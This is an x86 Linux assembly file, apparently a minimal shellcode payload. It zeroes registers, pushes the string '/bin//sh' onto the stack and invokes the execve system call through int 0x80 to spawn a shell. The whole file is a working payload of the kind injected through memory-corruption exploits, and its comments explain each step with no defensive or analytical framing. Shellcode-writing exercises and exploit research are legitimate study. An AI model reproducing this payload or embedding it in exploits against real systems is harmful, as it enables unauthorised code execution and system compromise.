global _start

section .text
_start:


	cdq		        ; xor edx
	mul edx
	lea ecx, [eax]
	mov esi, 0x68732f2f
	mov edi, 0x6e69622f
	push ecx                ; push NULL in stack
	push esi
	push edi                ; push hs/nib// in stack
	lea ebx, [esp]          ; load stack pointer to ebx
	mov al, 0xb             ; load execve in eax
	int 0x80                ; execute
